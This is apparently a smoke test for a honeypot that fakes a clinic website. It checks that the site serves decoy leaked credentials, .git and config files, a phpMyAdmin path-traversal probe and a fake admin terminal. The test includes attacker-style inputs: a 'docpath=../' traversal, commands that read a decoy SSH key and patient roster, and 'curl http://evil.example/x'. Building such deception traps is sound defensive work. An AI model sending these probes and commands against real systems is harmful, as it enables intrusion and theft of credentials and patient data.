#!/usr/bin/env python3
"""Smoke: public→privesc wired into phpapp.handle (local only, no AWS)."""

from __future__ import annotations

import base64
import io
import sys
import urllib.parse
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from anglerfish import phpapp  # noqa: E402
from anglerfish.public_privesc.creds import (  # noqa: E402
    BACKUP_PASS, BACKUP_USER, WEAK_PASS, WEAK_USER,
)
from anglerfish.public_privesc import tags  # noqa: E402

BAIT = ROOT / "anglerfish" / "public_privesc" / "bait"


def call(path, method="GET", body=b"", cookie="", world=None):
    w = dict(world or {})
    w.setdefault("company", "Example Clinic")
    w.setdefault("domain", "example.net")
    w["http_cookie"] = cookie
    w["bait_tags"] = []
    w["bait_events"] = []
    out = phpapp.handle(path, method=method, body=body, world=w, role="clinic")
    return out, w


def main() -> int:
    fails = []

    def check(name, cond, detail=""):
        if cond:
            print("  OK  %s" % name)
        else:
            print("  FAIL %s %s" % (name, detail))
            fails.append(name)

    # php2shell_chain still importable / untouched marker
    check("php2shell_chain present", phpapp._p2s_chain is not None)
    check("public_privesc adapter present", phpapp._public_privesc is not None)

    # Beat 1a — zip
    out, w = call("/backups/staff-portal-backup.zip")
    check("zip handled", out is not None)
    body, ctype, status, _, _ = out
    check("zip 200 PK", status == 200 and body[:2] == b"PK", "st=%s" % status)
    check("tag bait-public-leak", "bait-public-leak" in (w.get("bait_tags") or []))
    with zipfile.ZipFile(io.BytesIO(body)) as zf:
        cfg = zf.read("portal-config.bak").decode()
    check("zip has weak cred", WEAK_USER in cfg and WEAK_PASS in cfg)
    check("zip no backup pass", BACKUP_PASS not in cfg)

    out, w = call("/uploads/tmp/")
    body, ctype, status, _, _ = out
    check("uploads/tmp index", status == 200 and b"portal-config.bak" in body)

    out, w = call("/uploads/tmp/portal-config.bak")
    body, ctype, status, _, _ = out
    check("bak weak cred",
          status == 200 and WEAK_USER.encode() in body and WEAK_PASS.encode() in body)

    out, w = call("/assets/js/portal-config.js")
    body, ctype, status, _, _ = out
    check("js leak", status == 200 and WEAK_USER.encode() in body
          and b"window.PORTAL" in body)
    check("tag bait-public-leak-js",
          "bait-public-leak-js" in (w.get("bait_tags") or []))

    out, w = call("/robots.txt")
    body, ctype, status, _, _ = out
    check("robots hints", status == 200 and b"/backups/" in body)

    out, w = call("/phpmyadmin/")
    body, ctype, status, _, _ = out
    check("pma breadcrumb", status == 200
          and b"<!-- staging creds moved to /assets/js/portal-config.js -->" in body)
    check("tag bait-scanner-breadcrumb",
          "bait-scanner-breadcrumb" in (w.get("bait_tags") or []))

    out, w = call("/.git/HEAD")
    body, ctype, status, _, _ = out
    check("git HEAD", status == 200 and b"ref: refs/heads/staging" in body)

    out, w = call("/.git/config")
    body, ctype, status, _, _ = out
    check("git config pointer", status == 200 and b"portal-config.js" in body)
    check("git no backup pass", BACKUP_PASS.encode() not in body)

    out, w = call("/server-status")
    body, ctype, status, _, _ = out
    check("server-status", status == 200 and b"portal-config.js" in body)

    out, w = call("/actuator/env")
    body, ctype, status, _, _ = out
    check("actuator/env", status == 200 and b"portal-config.js" in body)

    out, w = call("/wp-login.php")
    body, ctype, status, _, _ = out
    check("wp-login breadcrumb", status == 200
          and b"<!-- staging creds moved to /assets/js/portal-config.js -->" in body)

    probe = ("/phpmyadmin/db_details_importdocsql.php"
             "?submit_show=true&do=import&docpath=../")
    out, w = call(probe)
    body, ctype, status, _, _ = out
    check("pma docpath 200", status == 200 and b"portal-config.js" in body)
    check("pma no /etc/passwd", b"root:x:0:0" not in body)
    check("tag bait-pma-docpath",
          "bait-pma-docpath" in (w.get("bait_tags") or []))
    check("pma file_read false",
          any(e.get("tag") == "bait-pma-docpath" and e.get("file_read") is False
              for e in (w.get("bait_events") or [])))

    # Clinic home still owned by phpapp (not pack)
    out, w = call("/")
    body, ctype, status, _, _ = out
    check("home still clinic", status == 200 and out is not None)
    check("home not pack-tagged", not (w.get("bait_tags") or []))

    # /login.php still clinic soft-fail (not pack weak login)
    out, w = call("/login.php")
    body, ctype, status, _, _ = out
    body_l = body if isinstance(body, (bytes, bytearray)) else str(body).encode()
    check("login.php clinic soft-fail page",
          status == 200 and (b"Staff" in body_l or b"staff" in body_l.lower()))
    check("login.php no bait-weak-login tag",
          "bait-weak-login" not in (w.get("bait_tags") or []))

    # Beat 2 — weak login via /portal/login.php
    form = urllib.parse.urlencode({
        "username": WEAK_USER, "password": WEAK_PASS,
    }).encode()
    out, w = call("/portal/login.php", method="POST", body=form)
    body, ctype, status, sc, extra = out
    check("weak login 302", status == 302, "st=%s" % status)
    check("tag bait-weak-login", "bait-weak-login" in (w.get("bait_tags") or []))
    set_cookie = " ".join(extra)
    check("LFSESSID set", "LFSESSID=" in set_cookie)
    sid = ""
    for h in extra:
        if "LFSESSID=" in h:
            sid = h.split("LFSESSID=")[1].split(";")[0].strip()
            break
    check("sid non-empty", bool(sid))

    cookie = "LFSESSID=%s" % sid
    out, w = call("/staff/dashboard.php", cookie=cookie)
    body, ctype, status, _, _ = out
    check("dashboard low-priv", status == 200 and b"www-data" in body)

    out, w = call("/staff/docs/it-handoff.txt", cookie=cookie)
    body, ctype, status, _, _ = out
    check("handoff post-auth",
          status == 200 and BACKUP_USER.encode() in body
          and BACKUP_PASS.encode() in body)
    check("tag bait-privesc", "bait-privesc" in (w.get("bait_tags") or []))

    out, w = call("/staff/docs/it-handoff.txt")  # no cookie
    body, ctype, status, _, _ = out
    check("handoff denied unauth", status in (401, 302), "st=%s" % status)
    check("handoff no backup pass unauth", BACKUP_PASS.encode() not in body)

    # Beat 3 — escalate + gotcha
    form = urllib.parse.urlencode({
        "user": BACKUP_USER, "pass": BACKUP_PASS, "cmd": "ls",
    }).encode()
    out, w = call("/staff/admin/term.php", method="POST", body=form, cookie=cookie)
    body, ctype, status, _, _ = out
    check("term escalate ls", status == 200 and b"patient_roster_q3.xlsx" in body)

    expect = (BAIT / "loot" / "patient_roster_q3.xlsx").read_bytes()
    form = urllib.parse.urlencode({
        "user": BACKUP_USER, "pass": BACKUP_PASS, "cmd": "cat patient_roster_q3.xlsx",
    }).encode()
    out, w = call("/staff/admin/term.php", method="POST", body=form, cookie=cookie)
    body, ctype, status, _, _ = out
    check("gotcha patient_roster_q3.xlsx bytes", status == 200 and body == expect,
          "got=%d expect=%d" % (len(body), len(expect)))
    check("tag bait-gotcha", "bait-gotcha" in (w.get("bait_tags") or []))

    laugh = (BAIT / "loot" / "staff_ssh_id_rsa").read_bytes()
    form = urllib.parse.urlencode({
        "user": BACKUP_USER, "pass": BACKUP_PASS, "cmd": "cat staff_ssh_id_rsa",
    }).encode()
    out, w = call("/staff/admin/term.php", method="POST", body=form, cookie=cookie)
    body, ctype, status, _, _ = out
    check("gotcha staff_ssh_id_rsa", status == 200 and body == laugh)

    form = urllib.parse.urlencode({
        "user": BACKUP_USER, "pass": BACKUP_PASS, "cmd": "base64 patient_roster_q3.xlsx",
    }).encode()
    out, w = call("/staff/admin/term.php", method="POST", body=form, cookie=cookie)
    body, ctype, status, _, _ = out
    expect_b64 = base64.b64encode(expect) + b"\n"
    check("base64 text not image",
          status == 200 and "image/" not in ctype and body == expect_b64,
          "ctype=%r" % ctype)

    form = urllib.parse.urlencode({
        "user": BACKUP_USER, "pass": BACKUP_PASS,
        "cmd": "curl http://evil.example/x",
    }).encode()
    out, w = call("/staff/admin/term.php", method="POST", body=form, cookie=cookie)
    body, ctype, status, _, _ = out
    check("curl stub OK claim", status == 200 and b"OK" in body)
    check("curl logged only",
          any(e.get("fetch_url_logged_only") for e in (w.get("bait_events") or [])),
          "evs=%r" % w.get("bait_events"))

    # Required tag constants exist
    for t in ("bait-public-leak", "bait-public-leak-js", "bait-scanner-breadcrumb",
              "bait-pma-docpath", "bait-weak-login", "bait-privesc", "bait-gotcha"):
        check("tag const %s" % t, t in tags.ALL_TAGS)

    print()
    if fails:
        print("FAILED: %s" % ", ".join(fails))
        return 1
    print("ALL WIRED SMOKE CHECKS PASSED (local only, no AWS)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
